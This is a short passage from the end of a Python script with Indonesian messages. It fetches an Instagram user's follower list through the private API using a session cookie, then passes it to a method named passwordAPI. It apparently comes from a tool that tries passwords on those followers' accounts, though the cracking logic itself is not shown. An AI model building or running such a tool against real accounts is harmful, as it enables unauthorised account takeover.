            info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)

if __name__=='__main__':
    try:
        login_kamu()
    except requests.exceptions.ConnectionError:
        exit(f'\n [{M}!{C}] Koneksi internet bermasalah')

